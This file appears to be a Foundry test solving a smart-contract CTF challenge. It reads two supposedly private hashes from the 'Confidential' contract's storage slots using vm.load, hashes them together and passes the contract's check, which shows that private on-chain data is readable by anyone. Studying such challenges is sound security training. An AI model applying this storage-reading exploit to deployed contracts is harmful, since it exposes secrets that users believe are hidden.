// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/ConfidentialHash/ConfidentialHash.sol";

contract ConfidentialHashExploit is Test {
    Confidential internal chash;
    address attacker;

    function setUp() public {
        chash = new Confidential();
        attacker = makeAddr("attacker");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        bytes32 aliceHash = vm.load(address(chash), bytes32(uint256(4)));
        bytes32 bobHash = vm.load(address(chash), bytes32(uint256(9)));
        bytes32 _hash = chash.hash(aliceHash, bobHash);
        chash.checkthehash(_hash);
        assertEq(chash.checkthehash(_hash), true);
        vm.stopPrank();
        console.log(unicode"\n Exploit successful ðŸ˜¾!!!!");
    }
}
